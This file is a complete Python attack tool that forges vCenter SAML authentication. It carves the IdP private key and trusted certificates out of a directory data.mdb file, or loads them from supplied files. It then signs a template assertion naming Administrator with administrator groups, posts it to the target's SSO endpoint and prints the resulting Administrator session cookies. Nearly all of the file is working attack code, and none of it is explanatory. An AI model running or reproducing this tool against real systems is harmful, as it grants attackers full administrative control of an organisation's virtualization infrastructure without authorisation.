#!/usr/bin/env python3
import argparse
import base64
import bitstring
import sys
import zlib
from string import printable
from urllib.parse import parse_qs, quote, unquote, urlparse

import socket
import ssl
import OpenSSL.crypto as crypto
from cryptography import x509

import ldap
import lxml.etree as etree
import requests
import urllib3
import xmlsec
from datetime import datetime
from dateutil.relativedelta import relativedelta
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
})

idp_key_flag = b'\x30\x82'
trusted_cert1_flag1 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
trusted_cert1_flag2 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x32\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-2,cn=TrustedCertificateChains,
trusted_cert1_flag3 = idp_key_flag
trusted_cert2_flag1 = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
trusted_cert2_flag2 = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x32' # \x01\x00\x12TrustedCertChain-2
trusted_cert2_flag3 = idp_key_flag
not_it_list = [b'Engineering', b'California', b'object']

SAML_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
      <saml2:ProxyRestriction Count="10"/>
      <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
      <saml2:AudienceRestriction>
        <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
      </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
    <saml2:AttributeStatement>
      <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>
"""


def writepem(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    cert = "-----BEGIN CERTIFICATE-----\n" + data + "\n-----END CERTIFICATE-----"
    if verbose:
        print('[*] Extracted a candidate for the Trusted certificate:')
        print(cert + '\n')

    return cert

    
def writekey(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    key = "-----BEGIN PRIVATE KEY-----\n" + data + "\n-----END PRIVATE KEY-----"
    if verbose:
        print('[*] Extracted a candidate for the IdP key:')
        print(key + '\n')
    
    return key


def check_key_valid(key_bytes, verbose=False):
    """
    PKCS keys begin with the following hex structure
    30 82 ?? ?? 02 01 00
    """
    if key_bytes.startswith(b"0\x82") and key_bytes[4:7] == b"\x02\x01\x00":
        return True
    else:
        if verbose:
            print("[!] Key does not begin with magic bytes")
        return False


def check_cert_valid(cert_bytes, verbose=False):
    """
    x509 certs begin with the following hex structure
    30 82 ?? ?? 30 82
    """
    if cert_bytes.startswith(b"0\x82") and cert_bytes[4:6] == b"0\x82":
        return True
    else:
        if verbose:
            print("[!] Certificate does not begin with magic bytes")
        return False


def check_cert_root_ca(cert_bytes, verbose=False):
    if isinstance(cert_bytes, str):
        cert_bytes = cert_bytes.encode()
    try:
        cert = x509.load_pem_x509_certificate(cert_bytes)
    except ValueError:
        if verbose:
            print("[!] Crypto error: could not load certificate")
        return False

    try:
        bc = cert.extensions.get_extension_for_class(x509.BasicConstraints)
        if bc.value.ca:
            return True
    except x509.ExtensionNotFound:
        pass

    if verbose:
        print("[!] Certificate is not a root certificate")
    return False


def check_private_key_matches_cert(private_key_str, cert_str):
    try:
        private_key = crypto.load_privatekey(crypto.FILETYPE_PEM, private_key_str)
        cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_str)

        pkey_pub = crypto.dump_publickey(crypto.FILETYPE_PEM, private_key)
        cert_pub = crypto.dump_publickey(crypto.FILETYPE_PEM, cert.get_pubkey())

        return pkey_pub == cert_pub
    except crypto.Error:
        return False


def get_idp_key_candidates(stream, verbose=False):
    tup = stream.findall(idp_key_flag, bytealigned=True)
    matches = list(tup)
    keys = []
    for match in matches:
        stream.pos = match - 16
        size_hex = stream.read('bytes:2')
        size = int(size_hex.hex(), 16)
        try:
            key_bytes = stream.read(f'bytes:{size}')
        except bitstring.ReadError:
            continue
        if any(not_it in key_bytes for not_it in not_it_list):
            continue

        if not check_key_valid(key_bytes):
            continue

        print('[*] Found a candidate for the IdP key') 
        key = writekey(key_bytes, verbose)
        keys.append(key)
    if keys:
        return keys

    print(f'[-] Failed to find the IdP key')
    sys.exit()


def get_idp_key(idp_key_candidates, trusted_cert1, verbose=False):
    for candidate in idp_key_candidates:
        if check_private_key_matches_cert(candidate, trusted_cert1):
            print('[*] Successfully extracted the IdP key')
            if verbose:
                print(candidate)
            return candidate

    print('[-] Failed to extract the IdP key')
    return False


def get_domain_from_cn(cn):
    parts = cn.split(',')
    domain_parts = []
    for part in parts:
        if part.lower().startswith('dc='):
            domain_parts.append(part[3:])
    domain = '.'.join(domain_parts).strip()
    domain = ''.join(char for char in domain if char in printable)
    return domain


def get_trusted_cert1_pem(stream, verbose=False):
    # Get TrustedCertificate1 pem 1
    cert1_size_hex = stream.read('bytes:2')
    cert1_size = int(cert1_size_hex.hex(), 16)
    cert1_bytes = stream.read(f'bytes:{cert1_size}')
    if verbose:
        print(f'[!] Cert 1 size: {cert1_size}')

    if b'ssoserverSign' not in cert1_bytes and b'STS' not in cert1_bytes:
        if verbose:
            print('[!] Cert does not contain ssoserverSign or STS - keep looking')
        return 

    if not check_cert_valid(cert1_bytes):
        return 
    cert1 = writepem(cert1_bytes, verbose)

    return cert1


def get_trusted_cert1_candidates(stream, domain_lookup=True, verbose=False):
    cert1_candidates = []
    if domain_lookup:
        for trusted_cert1_flag in [trusted_cert1_flag1, trusted_cert1_flag2]:
            tup = stream.findall(trusted_cert1_flag)
            matches = list(tup)
            if matches:
                for match in matches:
                    stream.pos = match
                    if verbose:
                        print(f'[!] Looking for cert 1 at position: {match}')

                    cn_end = stream.readto('0x000013', bytealigned=True)
                    cn_end_pos = stream.pos
                    if verbose:
                        print(f'[!] CN end position: {cn_end_pos}')

                    stream.pos = match
                    cn_len = int((cn_end_pos - match - 8) / 8)
                    try:
                        cn = stream.read(f'bytes:{cn_len}').decode()
                    except UnicodeDecodeError:
                        continue
                    domain = get_domain_from_cn(cn)
                    if domain:
                        print(f'[*] CN: {cn}')
                        print(f'[*] Domain: {domain}')
                    else:
                        print(f'[!] Failed parsing domain from CN')
                        sys.exit()

                    stream.readto(f'0x0002', bytealigned=True)
                    cert1 = get_trusted_cert1_pem(stream, verbose)
                    if cert1 is not None:
                        print('[*] Found a candidate for trusted certificate 1')
                        cert1_candidates.append((cert1, domain))
    else:
        tup = stream.findall(trusted_cert1_flag3)
        matches = list(tup)
        if matches:
            for match in matches:
                check_pos = match + 32
                if stream[check_pos : check_pos + 16] != '0x3082':
                    continue

                stream.pos = match - 16
                cert1 = get_trusted_cert1_pem(stream, verbose)
                if cert1 is not None:
                    print('[*] Found a candidate for trusted certificate 1')
                    cert1_candidates.append((cert1, None))
    if not cert1_candidates:
        print(f'[-] Failed to find the trusted certificate 1')
    return cert1_candidates


def get_trusted_cert2_pem(stream, verbose=False):
    # Get TrustedCertificate2 pem 1
    cert2_size_hex = stream.read('bytes:2')
    cert2_size = int(cert2_size_hex.hex(), 16)
    cert2_bytes = stream.read(f'bytes:{cert2_size}')
    if verbose:
        print(f'[!] Cert 2 size: {cert2_size}')

    if not check_cert_valid(cert2_bytes, verbose) or not check_cert_root_ca(writepem(cert2_bytes, verbose)):
        if verbose:
            print('[!] Cert is not a root CA - keep looking')
        return
    cert2 = writepem(cert2_bytes, verbose)

    print('[*] Successfully extracted trusted certificate 2')
    return cert2


def get_trusted_cert2(stream, verbose=False):
    for trusted_cert2_flag in [trusted_cert2_flag1, trusted_cert2_flag2]:
        tup = stream.findall(trusted_cert2_flag)
        matches = list(tup)
        for match in matches:
            for shift in [10240, 15360, 20480]:
                stream.pos = match - shift

                try:
                    stream.readto('0x3082', bytealigned=True)
                except:
                    break

                stream.pos = stream.pos - 32
                cert2 = get_trusted_cert2_pem(stream, verbose)
                if cert2 is not None:
                    return cert2
    else:
        tup = stream.findall(trusted_cert2_flag3)
        matches = list(tup)
        if matches:
            for match in matches:
                check_pos = match + 32
                if stream[check_pos : check_pos + 16] != '0x3082':
                    continue

                stream.pos = match - 16
                cert2 = get_trusted_cert2_pem(stream, verbose)
                if cert2 is not None:
                    return cert2
    print(f'[-] Failed to find the trusted cert 2')
    sys.exit()


def read_file(path, label):
    """Read a PEM/text file supplied on the command line"""
    try:
        with open(path, 'r') as f:
            return f.read()
    except OSError as e:
        print(f'[-] Failed reading {label} from {path}: {e}')
        sys.exit()


def cert_subject_cn(cert_str):
    """Return the Subject CN of a PEM certificate, or None on failure"""
    try:
        cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_str)
        return cert.get_subject().CN
    except crypto.Error:
        return None


def validate_manual_certs(cert1, cert2, verbose=False):
    """
    In manual mode, cert1 must be the signing cert (CN=ssoserverSign or CN=STS)
    and cert2 must be the root CA (CA:TRUE).
    If they were supplied in the wrong order, swap them; otherwise warn.
    """
    cert1_is_signer = cert_subject_cn(cert1) in ['ssoserverSign', 'STS']
    cert2_is_signer = cert_subject_cn(cert2) in ['ssoserverSign', 'STS']
    cert1_is_ca = check_cert_root_ca(cert1)
    cert2_is_ca = check_cert_root_ca(cert2)

    if cert1_is_signer and cert2_is_ca:
        if verbose:
            print('[*] cert1 (CN=ssoserverSign or CN=STS) and cert2 (CA:TRUE) look correct')
        return cert1, cert2

    if cert2_is_signer and cert1_is_ca:
        print('[!] --cert1 and --cert2 appear to be reversed - swapping them')
        return cert2, cert1

    if not cert1_is_signer:
        print("[!] Warning: --cert1 Subject CN is not 'ssoserverSign' or 'STS' "
              f"(got {cert_subject_cn(cert1)!r})")
    if not cert2_is_ca:
        print('[!] Warning: --cert2 is not a root certificate (CA:TRUE not found)')
    return cert1, cert2


def saml_request(vcenter):
    """Get SAML AuthnRequest from vCenter web UI"""
    try:
        print(f'[*] Initiating SAML request with {vcenter}')
        r = session.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        o = urlparse(r.headers["location"])
        query = parse_qs(o.query)
        sr = query["SAMLRequest"][0]
        dec = base64.decodebytes(sr.encode("utf-8"))
        req = zlib.decompress(dec, -8)
        if "RelayState" in query:
            return etree.fromstring(req), query["RelayState"][0]
        return etree.fromstring(req), None
    except:
        print(f'[-] Failed initiating SAML request with {vcenter}')
        raise


def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
    """Fill in the SAML response template"""
    try:
        print('[*] Generating SAML assertion') 
        # Generate valid timestamps
        before = (datetime.today() + relativedelta(months=-1)).isoformat()[:-3]+'Z'
        after = (datetime.today() + relativedelta(months=1)).isoformat()[:-3]+'Z'

        # Replace fields dynamically
        t = SAML_TEMPLATE
        t = t.replace("$VCENTER_IP", vcenter_ip)
        t = t.replace("$VCENTER", vcenter_hostname)
        t = t.replace("$DOMAIN", vcenter_domain)
        t = t.replace("$ID", req.get("ID"))
        t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
        t = t.replace("$NOT_BEFORE", before)
        t = t.replace("$NOT_AFTER", after)
        return etree.fromstring(t.encode("utf-8"))
    except:
        print('[-] Failed generating the SAML assertion')
        raise


def sign_assertion(root, cert1, cert2, key):
    """Sign the SAML assertion in the response using the IdP key"""
    try:
        print('[*] Signing the SAML assertion')
        assertion = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
        assertion_id = assertion.get("ID")
   
        ctx = xmlsec.SignatureContext()
        ctx.key = xmlsec.Key.from_memory(key, xmlsec.KeyFormat.PEM)
        ctx.key.load_cert_from_memory(cert1, xmlsec.KeyFormat.PEM)
        ctx.key.load_cert_from_memory(cert2, xmlsec.KeyFormat.PEM)
 
        sign_node = xmlsec.template.create(root, xmlsec.Transform.EXCL_C14N, xmlsec.Transform.RSA_SHA256, ns="ds")
        assertion.insert(1, sign_node)
        
        ref = xmlsec.template.add_reference(sign_node, xmlsec.Transform.SHA256, uri=f"#{assertion_id}")
        xmlsec.template.add_transform(ref, xmlsec.Transform.ENVELOPED)
        
        exc_c14n_transform = xmlsec.template.add_transform(ref, xmlsec.Transform.EXCL_C14N)
        inclusive_ns = etree.SubElement(
            exc_c14n_transform,
            f"{{{xmlsec.Transform.EXCL_C14N.href}}}InclusiveNamespaces",
            nsmap={"ec": xmlsec.Transform.EXCL_C14N.href}
        )
        inclusive_ns.set("PrefixList", "xsd xsi")

        key_info = xmlsec.template.ensure_key_info(sign_node)
        xmlsec.template.add_x509_data(key_info)
       
        # Remove the line feeds that break the signature
        parser = etree.XMLParser(remove_blank_text=True)
        root_str = etree.tostring(root)
        root = etree.XML(root_str, parser=parser)

        sign_node = xmlsec.tree.find_node(root, xmlsec.Node.SIGNATURE)
        assertion = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
        ctx.register_id(node=assertion, id_attr="ID")
        ctx.sign(sign_node)

        return root
    except:
        print('[-] Failed signing the SAML assertion')
        raise


def login(vcenter, saml_resp, relaystate):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    try:
        print('[*] Attempting to log into vCenter with the signed SAML request')
        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)

        if relaystate == None:
            data = {"SAMLResponse": base64.encodebytes(resp)}
        else:
            data = {"SAMLResponse": base64.encodebytes(resp), "RelayState":relaystate}

        r = session.post(
            f"https://{vcenter}/ui/saml/websso/sso",
            allow_redirects=False,
            verify=False,
            data=data,
        )
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        cookies = r.headers["Set-Cookie"].split(",")
        print(f'[+] Successfully obtained Administrator cookies for {vcenter}!')
        print(f'[+] Cookies:')
        for cookie in cookies:
            print("\t" + cookie.lstrip())
    except:
        print('[-] Failed logging in with SAML request')
        raise


def get_hostname(vcenter):
    try:
        print('[*] Obtaining hostname from vCenter SSL certificate')
        dst = (vcenter, 443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])

        # get certificate
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        hostname = x509.get_subject().CN
        print(f'[*] Found hostname {hostname} for {vcenter}')
        return hostname
    except:
        print(f'[-] Failed obtaining hostname from SSL certificates for {vcenter}')
        raise


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Forge a vCenter SAML assertion. Provide EITHER the data.mdb file '
                    '(-p, which is parsed for all the elements below) OR the individual '
                    'extracted elements (--idp-key, --cert1, --cert2 and -d).',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            'Examples:\n'
            '  From an mdb file:\n'
            '    %(prog)s -p data.mdb -t 10.0.0.1\n'
            '  From individually-supplied elements:\n'
            '    %(prog)s -t 10.0.0.1 -d vsphere.local \\\n'
            '        --idp-key idp.key --cert1 ssoserverSign.pem --cert2 ca.pem\n'
        ),
    )
    parser.add_argument('-p', '--path', help='The path to the data.mdb file')
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-d', '--domain', help='vCenter SSO domain (required in manual mode)')
    parser.add_argument('--idp-key', help='Manual mode: path to the IdP private key (PEM). Used instead of --path')
    parser.add_argument('--cert1', help="Manual mode: path to trusted certificate 1 - the signing cert with Subject CN=ssoserverSign or CN=STS (PEM). Used instead of --path")
    parser.add_argument('--cert2', help='Manual mode: path to trusted certificate 2 - the root CA cert with CA:TRUE (PEM). Used instead of --path')
    parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates and private key')
    args = parser.parse_args()

    if args.path:
        # Extract certificates and private key from the data.mdb file
        in_stream = open(args.path, 'rb')
        bin_stream = bitstring.ConstBitStream(in_stream)
        idp_key_candidates = get_idp_key_candidates(bin_stream, args.verbose)

        if args.domain is None:
            trusted_cert_1_candidates = get_trusted_cert1_candidates(bin_stream, domain_lookup=True, verbose=args.verbose)
        else:
            trusted_cert_1_candidates = get_trusted_cert1_candidates(bin_stream, domain_lookup=False, verbose=args.verbose)
            domain = args.domain

        for cert_1_cd, domain_cd in trusted_cert_1_candidates:
            idp_key = get_idp_key(idp_key_candidates, cert_1_cd, args.verbose)
            if idp_key:
                print('[*] Successfully extracted trusted certificate 1')
                trusted_cert_1 = cert_1_cd
                domain = domain_cd if domain_cd is not None else domain
                break
        else:
            sys.exit()

        trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
    else:
        # Use the individually-supplied elements instead of parsing an mdb file
        missing = [
            name for name, val in (
                ('--idp-key', args.idp_key),
                ('--cert1', args.cert1),
                ('--cert2', args.cert2),
                ('-d/--domain', args.domain),
            ) if not val
        ]
        if missing:
            parser.error(
                'either -p/--path OR all of --idp-key, --cert1, --cert2 and -d/--domain '
                'must be provided. Missing: ' + ', '.join(missing)
            )

        idp_key = read_file(args.idp_key, 'IdP key')
        trusted_cert_1 = read_file(args.cert1, 'trusted certificate 1')
        trusted_cert_2 = read_file(args.cert2, 'trusted certificate 2')
        domain = args.domain
        trusted_cert_1, trusted_cert_2 = validate_manual_certs(
            trusted_cert_1, trusted_cert_2, args.verbose)
        print('[*] Using IdP key, trusted certificates and domain supplied on the command line')

    # Generate SAML request
    hostname = get_hostname(args.target)
    req, relaystate = saml_request(args.target)
    t = fill_template(hostname, args.target, domain, req)
    s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_key)
    c = login(args.target, s, relaystate)

